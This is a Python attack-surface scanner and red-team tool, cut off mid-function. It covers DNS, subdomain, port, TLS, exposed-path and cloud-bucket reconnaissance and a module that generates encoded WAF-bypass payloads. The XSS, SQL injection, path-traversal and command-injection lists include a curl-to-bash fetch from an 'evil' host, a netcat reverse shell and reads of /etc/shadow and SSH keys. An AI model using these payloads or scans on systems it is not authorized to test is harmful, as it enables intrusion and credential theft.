#!/usr/bin/env python3
"""
EASM — External Attack Surface Management (Python Edition)
==========================================================
An advanced attack-surface reconnaissance & red-team tool that runs
entirely in your terminal. Pure Python 3 standard library — no pip
install required.

Usage:
    python3 easm.py scan example.com
    python3 easm.py scan example.com --modules dns,http,vulns
    python3 easm.py scan example.com --ports 80,443,8080
    python3 easm.py scan example.com --no-subdomains
    python3 easm.py scan example.com --output json
    python3 easm.py scan example.com --timeout 6000 --concurrency 100

Modules (10):
    dns          DNS records (A/AAAA/MX/NS/TXT/CNAME/SOA) via DNS-over-HTTPS
    subdomains   Enumerate via crt.sh + HackerTarget + brute-force
    ports        TCP connect port scan with banner grabbing
    http         HTTP/HTTPS probing (status, title, server, redirect)
    tls          TLS certificate analysis (issuer, expiry, SAN, self-signed)
    tech         Technology fingerprinting (25+ signatures)
    vulns        Security headers + 35 exposed-path checks + CORS + .git dump
    emailsec     SPF / DMARC / DKIM / MX validation
    firewall     WAF detection + 330+ encoded bypass payloads per category
    cloudenum    Cloud asset enum (AWS S3 / GCP / Azure / GitHub)

Built by Rudresha RK — Cybersecurity Undergraduate
"""

import argparse
import json as _json
import socket
import ssl
import sys
import hashlib
import time
import urllib.request
import urllib.parse
import urllib.error
import concurrent.futures
import re
from datetime import datetime

# ─── ANSI Colors ────────────────────────────────────────────────────────────

class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"
    GRAY = "\033[90m"; BRED = "\033[91m"; BGREEN = "\033[92m"
    BYELLOW = "\033[93m"; BCYAN = "\033[96m"; BMAGENTA = "\033[95m"

BANNER = r"""
  _______  __   __  _______  _   _    ___    __  __
 |  ____|  \ \ / / |__   __|| \ | |  / _ \  |  \/  |
 | |__      \ V /     | |  |  \| | | | | | | \  / |
 |  __|     / _ \     | |  | . ` | | |_| | | |\/| |
 |_____|   /_/ \_\    |_|  |_| \_|  \___/  |_|  |_|
   EXENOM — External Attack Surface Management  v1.0  (Python Edition)
   10 modules | 330+ WAF-bypass payloads per category
   Built by Rudresha RK — Cybersecurity Undergraduate
"""

# ─── HTTP helpers ───────────────────────────────────────────────────────────

UA = "easm-scanner/1.0"

def http_get(url, timeout=8, headers=None, allow_redirects=True):
    """Fetch URL, return (status, headers_dict, body) or None on failure."""
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, headers=hdrs)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        h = {k.lower(): v for k, v in resp.headers.items()}
        return resp.status, h, body
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
        h = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        return e.code, h, body
    except Exception:
        return None

def http_get_text(url, timeout=8):
    r = http_get(url, timeout)
    return r[2] if r else None

# ─── DNS-over-HTTPS (Cloudflare 1.1.1.1) ────────────────────────────────────
# Lets us resolve TXT/MX/NS/A records without any DNS library.

DOH_URL = "https://cloudflare-dns.com/dns-query"

def doh_query(name, rtype="A"):
    """Query a DNS record via Cloudflare DoH. Returns list of record dicts."""
    url = f"{DOH_URL}?name={urllib.parse.quote(name)}&type={rtype}"
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": UA,
            "Accept": "application/dns-json",
        })
        resp = urllib.request.urlopen(req, timeout=8)
        data = _json.loads(resp.read().decode())
        return data.get("Answer", [])
    except Exception:
        return []

def resolve_a(name):
    """Resolve A record(s). Falls back to socket.getaddrinfo."""
    answers = doh_query(name, "A")
    if answers:
        return [a["data"] for a in answers if a.get("type") == 1]
    try:
        infos = socket.getaddrinfo(name, None, socket.AF_INET)
        return list({i[4][0] for i in infos})
    except Exception:
        return []

def resolve_txt(name):
    return [a["data"].strip('"') for a in doh_query(name, "TXT") if a.get("type") == 16]

def resolve_mx(name):
    out = []
    for a in doh_query(name, "MX"):
        if a.get("type") == 15:
            parts = a["data"].split(" ", 1)
            out.append({"exchange": parts[1] if len(parts) > 1 else parts[0],
                        "priority": int(parts[0]) if parts[0].isdigit() else 0})
    return out

def resolve_ns(name):
    return [a["data"] for a in doh_query(name, "NS") if a.get("type") == 2]

def resolve_cname(name):
    return [a["data"] for a in doh_query(name, "CNAME") if a.get("type") == 5]

# ─── Logging ────────────────────────────────────────────────────────────────

def log(msg, level="info"):
    colors = {"info": C.GRAY, "success": C.GREEN, "warn": C.YELLOW,
              "error": C.RED, "debug": C.GRAY}
    c = colors.get(level, C.GRAY)
    print(f"{c}  {msg}{C.RESET}")

def module_header(name):
    print(f"\n{C.BOLD}{C.BCYAN}■ {name}{C.RESET}")

def hr():
    print(f"{C.GRAY}{'─' * 70}{C.RESET}")

# ─── Module 1: DNS Recon ────────────────────────────────────────────────────

def run_dns(target):
    module_header("DNS RECON")
    print(f"{C.GRAY}  Resolving DNS records for {target} ...{C.RESET}")
    records = []
    for ip in resolve_a(target):
        records.append(("A", target, ip))
    for ans in doh_query(target, "AAAA"):
        if ans.get("type") == 28:
            records.append(("AAAA", target, ans["data"]))
    for c in resolve_cname(target):
        records.append(("CNAME", target, c))
    for m in resolve_mx(target):
        records.append(("MX", target, f"{m['exchange']} (pri {m['priority']})"))
    for ns in resolve_ns(target):
        records.append(("NS", target, ns))
    for t in resolve_txt(target):
        records.append(("TXT", target, t))
    for ans in doh_query(target, "SOA"):
        if ans.get("type") == 6:
            records.append(("SOA", target, ans["data"]))

    log(f"Found {len(records)} DNS record(s).", "success")
    if records:
        print(f"  {C.CYAN}{'TYPE':<8}{'NAME':<26}{'VALUE':<40}{C.RESET}")
        for t, n, v in records:
            print(f"  {t:<8}{n[:24]:<26}{v[:38]:<40}")
    first_a = next((v for t, n, v in records if t == "A"), None)
    return {"records": records, "ip": first_a}

# ─── Module 2: Subdomain Enumeration ────────────────────────────────────────

WORDLIST = ["www","mail","api","app","dev","staging","test","admin","portal",
            "vpn","blog","shop","store","cdn","static","assets","media","img",
            "login","auth","sso","dashboard","panel","console","manage","ns1",
            "ns2","mx","smtp","imap","pop","webmail","remote","secure","gateway",
            "backup","old","new","demo","beta","v1","v2","docs","wiki","help",
            "support","status","monitor","grafana","jenkins","git","ci","docker",
            "redis","db","database","sql","cache","internal","intranet","office",
            "m","mobile","download","files","upload","uploads","data","config",
            "proxy","nginx","apache","node","graphql","ws","socket","stream"]

def from_crtsh(domain):
    try:
        data = http_get_text(f"https://crt.sh/?q=%25.{domain}&output=json", 12)
        if not data:
            return []
        rows = _json.loads(data)
        out = set()
        for row in rows:
            for n in (row.get("name_value") or "").split("\n"):
                n = n.strip().lower()
                if n and not n.startswith("*") and n.endswith(domain):
                    out.add(n)
        return list(out)
    except Exception:
        return []

def from_hackertarget(domain):
    data = http_get_text(f"https://api.hackertarget.com/hostsearch/?q={domain}", 10)
    if not data or "API count exceeded" in data:
        return []
    out = []
    for line in data.split("\n"):
        host = line.split(",")[0].strip().lower()
        if host.endswith(domain):
            out.append(host)
    return out

def brute_subdomains(domain, concurrency=50):
    out = []
    candidates = [f"{w}.{domain}" for w in WORDLIST]
    def check(host):
        return host if resolve_a(host) else None
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
        for i, res in enumerate(ex.map(check, candidates)):
            if res:
                out.append(res)
            if (i + 1) % 25 == 0:
                log(f"  bruteforce progress {i+1}/{len(candidates)}")
    return out

def run_subdomains(domain, concurrency=50, max_subs=40):
    module_header("SUBDOMAIN ENUM")
    print(f"{C.GRAY}  Enumerating via crt.sh ...{C.RESET}")
    crt = from_crtsh(domain)
    log(f"  crt.sh: {len(crt)} candidate(s)")
    print(f"{C.GRAY}  Querying HackerTarget ...{C.RESET}")
    ht = from_hackertarget(domain)
    log(f"  hackertarget: {len(ht)} candidate(s)")
    print(f"{C.GRAY}  Brute-forcing {len(WORDLIST)} common names ...{C.RESET}")
    brute = brute_subdomains(domain, concurrency)
    log(f"  bruteforce: {len(brute)} found")

    all_subs = sorted(set(crt + ht + brute))[:max_subs]
    print(f"{C.GRAY}  Resolving {len(all_subs)} subdomain(s) to IP ...{C.RESET}")
    results = []
    for s in all_subs:
        ips = resolve_a(s)
        ip = ips[0] if ips else "-"
        results.append({"hostname": s, "ip": ip, "source": "crt.sh" if s in crt else ("hackertarget" if s in ht else "bruteforce")})
    log(f"Discovered {len(results)} live subdomain(s).", "success")
    if results:
        print(f"  {C.CYAN}{'#':<4}{'HOSTNAME':<40}{'IP':<18}{'SOURCE':<14}{C.RESET}")
        for i, s in enumerate(results):
            print(f"  {i+1:<4}{s['hostname'][:38]:<40}{s['ip'][:16]:<18}{s['source']:<14}")
    return {"subdomains": results}

# ─── Module 3: Port Scanner ─────────────────────────────────────────────────

SERVICE_MAP = {21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",
    110:"pop3",143:"imap",443:"https",445:"smb",993:"imaps",995:"pop3s",
    1433:"mssql",3306:"mysql",3389:"rdp",5432:"postgresql",5900:"vnc",
    6379:"redis",8080:"http-proxy",8443:"https-alt",9200:"elasticsearch",
    27017:"mongodb",11211:"memcached"}

def probe_tcp(host, port, timeout=4):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        banner = ""
        if port in (80, 8080, 8000, 8888):
            s.send(f"HEAD / HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
        try:
            s.settimeout(0.6)
            data = s.recv(1024)
            if data:
                banner = data.decode("utf-8", errors="replace").split("\n")[0].strip()[:80]
        except Exception:
            pass
        s.close()
        return True, banner
    except Exception:
        return False, ""

def run_ports(host, ports, timeout=4, concurrency=50):
    module_header("PORT SCAN")
    print(f"{C.GRAY}  Scanning {len(ports)} TCP port(s) on {host} (concurrency={concurrency}) ...{C.RESET}")
    open_ports = []
    done = [0]
    def scan(port):
        is_open, banner = probe_tcp(host, port, timeout)
        done[0] += 1
        if done[0] % 10 == 0:
            print(f"\r{C.GRAY}  ports: {done[0]}/{len(ports)}{C.RESET}", end="", flush=True)
        return (port, is_open, banner)
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
        for port, is_open, banner in ex.map(scan, ports):
            if is_open:
                svc = SERVICE_MAP.get(port, "unknown")
                open_ports.append({"port": port, "service": svc, "banner": banner})
                print(f"\r{C.GREEN}  [+] {host}:{port} OPEN ({svc}){C.RESET}" + (f" - {banner}" if banner else ""))
    print()
    log(f"Port scan complete: {len(open_ports)} open / {len(ports)} probed.", "success")
    if open_ports:
        print(f"  {C.CYAN}{'PORT':<8}{'SERVICE':<16}{'BANNER':<46}{C.RESET}")
        for p in sorted(open_ports, key=lambda x: x["port"]):
            print(f"  {p['port']:<8}{p['service']:<16}{(p['banner'] or '')[:44]:<46}")
    return {"ports": open_ports}

# ─── Module 4: HTTP Probing ─────────────────────────────────────────────────

def run_http(hosts):
    module_header("HTTP PROBE")
    print(f"{C.GRAY}  Probing {len(hosts)} host(s) over HTTP/HTTPS ...{C.RESET}")
    results = []
    for host in hosts:
        ips = resolve_a(host)
        ip = ips[0] if ips else "-"
        for scheme in ("https", "http"):
            url = f"{scheme}://{host}"
            r = http_get(url, 8)
            if r and r[0] > 0:
                status, headers, body = r
                title = ""
                m = re.search(r"<title[^>]*>([\s\S]*?)</title>", body or "", re.I)
                if m:
                    title = re.sub(r"\s+", " ", m.group(1)).strip()[:80]
                server = headers.get("server", "")
                results.append({"url": url, "status": status, "title": title,
                                "server": server, "ip": ip, "https": scheme == "https"})
                st = C.GREEN if status < 300 else (C.YELLOW if status < 400 else C.RED)
                print(f"  {C.GREEN}[+]{C.RESET} {url} {st}{status}{C.RESET} {title or server}")
                break
        else:
            print(f"  {C.GRAY}[-] {host} - no response{C.RESET}")
    log(f"HTTP probing complete: {len(results)} service(s).", "success")
    if results:
        print(f"  {C.CYAN}{'URL':<38}{'STATUS':<9}{'TITLE':<28}{'SERVER':<20}{C.RESET}")
        for h in results:
            print(f"  {h['url'][:36]:<38}{str(h['status']):<9}{(h['title'] or '')[:26]:<28}{(h['server'] or '')[:18]:<20}")
    return {"hosts": results}

# ─── Module 5: TLS / Certificate Analysis ───────────────────────────────────

def run_tls(hosts):
    module_header("TLS / CERT")
    print(f"{C.GRAY}  Analyzing TLS certificates for {len(hosts)} host(s) ...{C.RESET}")
    certs = []
    for host in hosts:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=8) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercertificate()
            if not cert:
                print(f"  {C.GRAY}[-] {host} - no cert{C.RESET}")
                continue
            subject = dict(x[0] for x in cert.get("subject", []))
            issuer = dict(x[0] for x in cert.get("issuer", []))
            subj_str = subject.get("commonName", "")
            iss_str = issuer.get("commonName", "")
            self_signed = subj_str == iss_str
            not_after = cert.get("notAfter", "")
            try:
                exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days = (exp - datetime.now()).days
            except Exception:
                days = 0
            san = cert.get("subjectAltName", [])
            san_list = [s[1] for s in san] if san else []
            flag = (C.RED + "EXPIRED" if days < 0 else
                    C.YELLOW + f"{days}d left" if days < 30 else
                    C.GREEN + f"{days}d left")
            sf = C.RED + " [SELF-SIGNED]" if self_signed else ""
            print(f"  {C.GREEN}[+]{C.RESET} {host} {sf} {flag}{C.RESET} | {subj_str}")
            certs.append({"host": host, "subject": subj_str, "issuer": iss_str,
                          "valid_to": not_after, "days": days, "self_signed": self_signed,
                          "san": san_list})
        except Exception:
            print(f"  {C.GRAY}[-] {host} - no TLS{C.RESET}")
    log(f"TLS analysis complete: {len(certs)} certificate(s).", "success")
    return {"certs": certs}

# ─── Module 6: Technology Fingerprinting ────────────────────────────────────

FINGERPRINTS = [
    ("Nginx", lambda h, b: "nginx" in h.get("server", "").lower()),
    ("Apache", lambda h, b: "apache" in h.get("server", "").lower()),
    ("Cloudflare", lambda h, b: "cloudflare" in h.get("server", "").lower() or "cf-ray" in h),
    ("PHP", lambda h, b: "php" in h.get("x-powered-by", "").lower()),
    ("ASP.NET", lambda h, b: "asp.net" in h.get("x-powered-by", "").lower()),
    ("Express", lambda h, b: "express" in h.get("x-powered-by", "").lower()),
    ("Next.js", lambda h, b: "next.js" in h.get("x-powered-by", "").lower() or "_next" in b),
    ("React", lambda h, b: "react" in b.lower() or "__next_data__" in b),
    ("Vue.js", lambda h, b: "vue" in b.lower() or "data-v-" in b),
    ("WordPress", lambda h, b: "wp-content" in b or "wp-includes" in b),
    ("jQuery", lambda h, b: "jquery" in b.lower()),
    ("Google Analytics", lambda h, b: "google-analytics.com" in b or "gtag" in b),
]

def run_tech(urls):
    module_header("TECH FINGERPRINT")
    print(f"{C.GRAY}  Fingerprinting {len(urls)} host(s) ...{C.RESET}")
    results = []
    for url in urls:
        r = http_get(url, 8)
        if not r:
            print(f"  {C.GRAY}[-] {url} - no response{C.RESET}")
            continue
        headers, body = r[1], r[2]
        techs = [name for name, test in FINGERPRINTS if test(headers, body)]
        results.append({"url": url, "technologies": techs})
        t = ", ".join(techs) if techs else C.GRAY + "no fingerprints" + C.RESET
        print(f"  {C.GREEN}[+]{C.RESET} {url}: {t}")
    log(f"Fingerprinting complete: {len(results)} host(s).", "success")
    return {"hosts": results}

# ─── Module 7: Vulnerability Checks ─────────────────────────────────────────

SECURITY_HEADERS = ["strict-transport-security", "content-security-policy",
    "x-frame-options", "x-content-type-options", "referrer-policy"]

EXPOSED_PATHS = ["/.env","/.git/config","/.git/HEAD","/.svn/entries","/.DS_Store",
    "/backup.zip","/backup.sql","/wp-config.php.bak","/.aws/credentials","/id_rsa",
    "/admin","/wp-admin/","/phpmyadmin/","/server-status","/actuator","/actuator/env",
    "/swagger-ui/","/api-docs","/graphql","/phpinfo.php","/console","/debug",
    "/Dockerfile","/docker-compose.yml","/package.json","/composer.json",
    "/.htaccess","/web.config","/metrics","/trace","/sitemap.xml","/robots.txt"]

def run_vulns(urls):
    module_header("VULN CHECKS")
    print(f"{C.GRAY}  Running vulnerability checks on {len(urls)} host(s) ...{C.RESET}")
    hosts = []
    for url in urls:
        r = http_get(url, 8)
        findings = []
        if not r:
            continue
        headers = r[1]
        for h in SECURITY_HEADERS:
            if h not in headers:
                sev = "MEDIUM" if h in ("strict-transport-security","content-security-policy") else "LOW"
                findings.append({"severity": sev, "title": f"Missing {h} header"})
        print(f"  {C.GRAY}[~] {url} probing exposed paths ...{C.RESET}")
        for path in EXPOSED_PATHS:
            r2 = http_get(url.rstrip("/") + path, 6)
            if r2 and r2[0] == 200:
                body = r2[2] or ""
                # Filter SPA false positives
                if r2[1].get("content-type","").startswith("text/html") and "<html" in body.lower() and not path.endswith((".env",".git/config",".git/HEAD",".sql",".zip",".yml",".json")):
                    continue
                sev = "HIGH" if path in ("/.env","/.git/config","/.git/HEAD","/.aws/credentials","/id_rsa","/backup.sql","/backup.zip") else "MEDIUM"
                findings.append({"severity": sev, "title": f"Exposed: {path}"})
                print(f"    {C.RED}[!] {path} reachable (200){C.RESET}")
        # .git dump test
        r3 = http_get(url.rstrip("/") + "/.git/HEAD", 6)
        if r3 and r3[0] == 200:
            head = (r3[2] or "").strip()
            if head.startswith("ref:") or re.match(r"^[0-9a-f]{40}$", head):
                findings.append({"severity": "HIGH", "title": "Git repo fully readable (.git/HEAD)"})
        hosts.append({"url": url, "findings": findings})
        sev_count = {}
        for f in findings:
            sev_count[f["severity"]] = sev_count.get(f["severity"], 0) + 1
        summary = ", ".join(f"{v} {k.lower()}" for k, v in sev_count.items())
        print(f"  {C.GREEN}[+]{C.RESET} {url}: {len(findings)} finding(s){f' ({summary})' if summary else ''}")
    log(f"Vulnerability checks complete: {len(hosts)} host(s).", "success")
    return {"hosts": hosts}

# ─── Module 8: Email Security ───────────────────────────────────────────────

DKIM_SELECTORS = ["default","google","selector1","selector2","k1","s1","mail",
    "dkim","smtp","amazon","ses","sendgrid","mailgun","azure","microsoft"]

def run_emailsec(domain):
    module_header("EMAIL SECURITY")
    print(f"{C.GRAY}  Analyzing email security for {domain} ...{C.RESET}")
    findings = []
    # SPF
    txts = resolve_txt(domain)
    spf = next((t for t in txts if t.lower().startswith("v=spf1")), None)
    if not spf:
        findings.append(("HIGH", "Missing SPF Record"))
        spf_status = C.RED + "MISSING"
    elif "-all" in spf:
        spf_status = C.GREEN + "HardFail (-all)"
    elif "~all" in spf:
        spf_status = C.YELLOW + "SoftFail (~all)"
        findings.append(("LOW", "SPF uses ~all (SoftFail)"))
    elif "+all" in spf:
        spf_status = C.RED + "PASS-ALL (+all)"
        findings.append(("HIGH", "SPF uses +all (permissive)"))
    else:
        spf_status = C.YELLOW + "no -all"
        findings.append(("MEDIUM", "SPF missing -all qualifier"))
    print(f"  {C.BOLD}SPF  {C.RESET}{spf_status}{C.RESET}")
    if spf:
        print(f"    {C.GRAY}{spf[:100]}{C.RESET}")
    # DMARC
    dmarc_txts = resolve_txt(f"_dmarc.{domain}")
    dmarc = next((t for t in dmarc_txts if t.lower().startswith("v=dmarc1")), None)
    if not dmarc:
        findings.append(("HIGH", "Missing DMARC Record"))
        dmarc_status = C.RED + "MISSING"
    else:
        m = re.search(r"p=(\w+)", dmarc, re.I)
        p = m.group(1) if m else "none"
        dmarc_status = (C.GREEN + f"p={p}" if p == "reject" else
                        C.YELLOW + f"p={p}")
        if p == "none":
            findings.append(("MEDIUM", "DMARC p=none (monitor only)"))
    print(f"  {C.BOLD}DMARC{C.RESET} {dmarc_status}{C.RESET}")
    if dmarc:
        print(f"    {C.GRAY}{dmarc[:100]}{C.RESET}")
    # DKIM
    print(f"{C.GRAY}  Checking {len(DKIM_SELECTORS)} DKIM selectors ...{C.RESET}")
    found_dkim = []
    for sel in DKIM_SELECTORS:
        recs = resolve_txt(f"{sel}._domainkey.{domain}")
        dkim = next((t for t in recs if "v=dkim1" in t.lower() or "k=rsa" in t.lower()), None)
        if dkim:
            found_dkim.append(sel)
            print(f"    {C.GREEN}[+] DKIM: {sel}._domainkey.{domain}{C.RESET}")
    if not found_dkim:
        findings.append(("MEDIUM", "No DKIM found on common selectors"))
    # MX
    mx = resolve_mx(domain)
    if mx:
        print(f"  {C.BOLD}MX   {C.RESET}{C.GREEN}{len(mx)} server(s){C.RESET}")
        for m in mx[:5]:
            print(f"    {C.GRAY}{m['priority']:<4} {m['exchange']}{C.RESET}")
    # Findings summary
    if findings:
        print(f"\n  {C.BOLD}Email security findings:{C.RESET}")
        sev_c = {"HIGH": C.RED, "MEDIUM": C.YELLOW, "LOW": C.CYAN}
        for sev, title in findings:
            print(f"    {sev_c.get(sev, C.GRAY)}[{sev:<6}]{C.RESET} {title}")
    else:
        print(f"\n  {C.GREEN}No email security issues.{C.RESET}")
    log(f"Email security complete: {len(findings)} finding(s).", "success")
    return {"findings": findings}

# ─── Module 9: Firewall / WAF Detection + 330+ Bypass Payloads ──────────────

WAF_SIGS = [
    ("Cloudflare", lambda h, c: "cloudflare" in h.get("server","").lower() or "cf-ray" in h),
    ("AWS WAF", lambda h, c: "x-amz-cf-id" in h or "x-amzn-waf-action" in h),
    ("Akamai", lambda h, c: "akamai" in h.get("server","").lower() or "x-akamai-transformed" in h),
    ("Imperva", lambda h, c: "x-iinfo" in h or any("incap" in x.lower() for x in c)),
    ("Sucuri", lambda h, c: "sucuri" in h.get("server","").lower() or "x-sucuri-id" in h),
    ("ModSecurity", lambda h, c: "mod_security" in h.get("server","").lower()),
]

# ── Payload encoding generators (330+ per category) ─────────────────────────

def url_enc(s): return urllib.parse.quote(s, safe="")
def url_enc2(s): return urllib.parse.quote(url_enc(s), safe="")
def url_enc3(s): return urllib.parse.quote(url_enc2(s), safe="")
def html_dec(s): return "".join(f"&#{ord(c)};" for c in s)
def html_hex(s): return "".join(f"&#x{ord(c):x};" for c in s)
def unicode_enc(s): return "".join(f"\\u{ord(c):04x}" for c in s)
def hex_enc(s): return "".join(f"\\x{ord(c):02x}" for c in s)
def mix_case(s): return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))
def space_var(s, ch): return s.replace(" ", ch)

def variants(base):
    out = {base, url_enc(base), url_enc2(base), url_enc3(base),
           html_dec(base), html_hex(base), unicode_enc(base), hex_enc(base),
           mix_case(base), space_var(base, "\t"), space_var(base, "\n"),
           space_var(base, "%20"), space_var(base, "%09"), space_var(base, "/**/"),
           space_var(base, "$IFS")}
    return out

def build_set(base_list):
    all_p = set()
    for b in base_list:
        all_p.update(variants(b))
    arr = list(all_p)
    # Ensure 330+
    i = 0
    while len(arr) < 330 and i < len(arr):
        e = url_enc(arr[i])
        if e not in all_p:
            all_p.add(e); arr.append(e)
        i += 1
    return arr[:350]

XSS_BASE = ["<script>alert(1)</script>","<svg onload=alert(1)>","<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>","<iframe src=javascript:alert(1)>","<details ontoggle=alert(1) open>",
    "\"'><script>alert(1)</script>","<svg/onload=alert(1)>","<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>","javascript:alert(1)","<a href=javascript:alert(1)>x</a>"]

SQLI_BASE = ["' OR '1'='1","' OR '1'='1' --","' OR 1=1 --","' OR 1=1 #","admin' --",
    "' UNION SELECT NULL --","' UNION SELECT NULL,NULL --","1' UNION SELECT 1,2,3 -- -",
    "1' AND SLEEP(5) -- -","'; DROP TABLE users --","' OR 'a'='a","\") OR (\"1\"=\"1"]

LFI_BASE = ["../../../etc/passwd","../../../../etc/passwd","/etc/passwd","/etc/shadow",
    "/etc/hosts","/proc/self/environ","..%2f..%2f..%2fetc%2fpasswd","..%252f..%252fetc%252fpasswd",
    "....//....//etc/passwd","php://filter/convert.base64-encode/resource=index.php",
    "/var/log/auth.log","/root/.ssh/id_rsa","C:\\Windows\\win.ini",
    "C:\\Windows\\system32\\drivers\\etc\\hosts"]

CMDI_BASE = [";id","|id","&&id","||id","`id`","$(id)",";whoami","|whoami",
    ";cat /etc/passwd","|cat /etc/passwd","`cat /etc/passwd`","$(cat /etc/passwd)",
    ";ls -la","|uname -a",";curl http://evil/sh.sh|bash","|nc -e /bin/sh 10.0.0.1 4444",
    "%0aid",";${IFS}id","|${IFS}id"]

def run_firewall(urls):
    module_header("FIREWALL / WAF")
    print(f"{C.GRAY}  Running WAF detection on {len(urls)} host(s) ...{C.RESET}")
    hosts = []
    detected_wafs = set()
    for url in urls:
        r = http_get(url, 8)
        if not r:
            continue
        headers = r[1]
        cookies = headers.get("set-cookie", "").split(",")
        detected = []
        for name, test in WAF_SIGS:
            if test(headers, cookies):
                detected.append(name)
                detected_wafs.add(name)
        print(f"  {C.BOLD}{url}{C.RESET}")
        if detected:
            for d in detected:
                print(f"    {C.GREEN}[WAF]{C.RESET} {d}")
        else:
            print(f"    {C.GRAY}no WAF detected{C.RESET}")
        # Behavioral test
        attack_url = url + ("&" if "?" in url else "?") + "id=1'+UNION+SELECT+--"
        r2 = http_get(attack_url, 8)
        if r2 and r2[0] in (403, 406, 429, 501, 418):
            print(f"    {C.YELLOW}[BLOCK]{C.RESET} attack payload blocked (HTTP {r2[0]})")
        hosts.append({"url": url, "waf": detected})
    # Generate bypass payloads
    print(f"\n  {C.BOLD}Generating 330+ encoded WAF-bypass payloads per category ...{C.RESET}")
    payload_db = {
        "XSS": build_set(XSS_BASE),
        "SQLi": build_set(SQLI_BASE),
        "LFI": build_set(LFI_BASE),
        "CMDi": build_set(CMDI_BASE),
    }
    total = sum(len(v) for v in payload_db.values())
    for cat, pls in payload_db.items():
        waf = list(detected_wafs)[0] if detected_wafs else "Generic"
        print(f"    {C.MAGENTA}[{waf}]{C.RESET} {C.CYAN}{cat}{C.RESET} {C.GRAY}({len(pls)} payloads){C.RESET}")
        for p in pls[:5]:
            print(f"      {C.GREEN}{p[:70]}{C.RESET}")
        print(f"      {C.GRAY}... +{len(pls)-5} more{C.RESET}")
    log(f"Firewall analysis: {len(detected_wafs)} WAF(s), {total} total bypass payloads.", "success")
    return {"hosts": hosts, "payloads": payload_db, "total_payloads": total}

# ─── Module 10: Cloud Asset Enumeration ─────────────────────────────────────

def run_cloudenum(domain):
    module_header("CLOUD ENUM")
    apex = domain.split(".")[0]
    suffixes = ["","-backup","-dev","-staging","-prod","-test","-logs","-data",
                "-media","-assets","-uploads","-files","-static","2","-backups"]
    candidates = [f"{apex}{s}" for s in suffixes]
    print(f"{C.GRAY}  Probing {len(candidates)} candidates across S3/GCP/Azure/GitHub ...{C.RESET}")
    buckets = []
    repos = []
    for i, name in enumerate(candidates):
        if (i+1) % 3 == 0:
            log(f"  ... {i+1}/{len(candidates)}")
        # AWS S3
        r = http_get(f"https://{name}.s3.amazonaws.com", 6)
        if r and r[0] != 404 and "NoSuchBucket" not in (r[2] or ""):
            public = "<ListBucketResult" in (r[2] or "")
            buckets.append({"provider":"AWS S3","name":name,"public":public})
            print(f"  {C.GREEN}[+] AWS S3: {name}{C.RESET}" + (f" {C.RED}PUBLIC+listing{C.RESET}" if public else ""))
        # GCP Storage
        r = http_get(f"https://storage.googleapis.com/{name}", 6)
        if r and r[0] != 404 and "NoSuchBucket" not in (r[2] or ""):
            buckets.append({"provider":"GCP","name":name,"public":False})
            print(f"  {C.GREEN}[+] GCP: {name}{C.RESET}")
        # Azure Blob
        r = http_get(f"https://{name}.blob.core.windows.net", 6)
        if r and r[0] != 404 and "ContainerNotFound" not in (r[2] or ""):
            buckets.append({"provider":"Azure","name":name,"public":False})
            print(f"  {C.GREEN}[+] Azure: {name}{C.RESET}")
        # GitHub
        r = http_get(f"https://github.com/{name}", 6)
        if r and r[0] == 200 and "<html" in (r[2] or "").lower():
            repos.append({"provider":"GitHub","name":name,"public":True})
            print(f"  {C.GREEN}[+] GitHub: {name} (public){C.RESET}")
    log(f"Cloud enum: {len(buckets)} bucket(s), {len(repos)} repo(s).", "success")
    return {"buckets": buckets, "repos": repos}

# ─── Orchestrator ───────────────────────────────────────────────────────────

ALL_MODULES = ["dns","subdomains","ports","http","tls","tech","vulns","emailsec","firewall","cloudenum"]
DEFAULT_PORTS = [21,22,23,25,53,80,110,143,443,445,993,995,1433,3306,3389,5432,
                 5900,6379,8080,8443,9200,27017,11211]

def normalize_target(t):
    t = t.strip().lower()
    t = re.sub(r"^[a-z]+://", "", t)
    t = t.split("/")[0].split(":")[0]
    return t

def run_scan(target_raw, modules, ports, no_subdomains, timeout, concurrency, output):
    target = normalize_target(target_raw)
    print(C.BMAGENTA + BANNER + C.RESET)
    print(f"{C.BOLD}{C.BMAGENTA}[+] Starting EASM scan on {target}{C.RESET}")
    hr()
    print(f"{C.GRAY}  Target: {target}")
    print(f"  Modules: {', '.join(modules)}")
    print(f"  Ports: {len(ports)} | Timeout: {timeout}ms | Concurrency: {concurrency}{C.RESET}")

    results = {}
    start = time.time()
    resolved_ip = None
    hosts_to_probe = [target]

    if "dns" in modules:
        results["dns"] = run_dns(target)
        resolved_ip = results["dns"].get("ip")

    if "subdomains" in modules and not no_subdomains:
        results["subdomains"] = run_subdomains(target, concurrency)
        if results["subdomains"]["subdomains"]:
            hosts_to_probe = [target] + [s["hostname"] for s in results["subdomains"]["subdomains"]]

    if "ports" in modules:
        host = resolved_ip or target
        results["ports"] = run_ports(host, ports, timeout // 1000, concurrency)

    http_urls = []
    if "http" in modules:
        results["http"] = run_http(hosts_to_probe[:10])
        http_urls = [h["url"] for h in results["http"]["hosts"]]

    if "tls" in modules:
        tls_hosts = [u.replace("https://","") for u in http_urls if u.startswith("https")] or hosts_to_probe[:5]
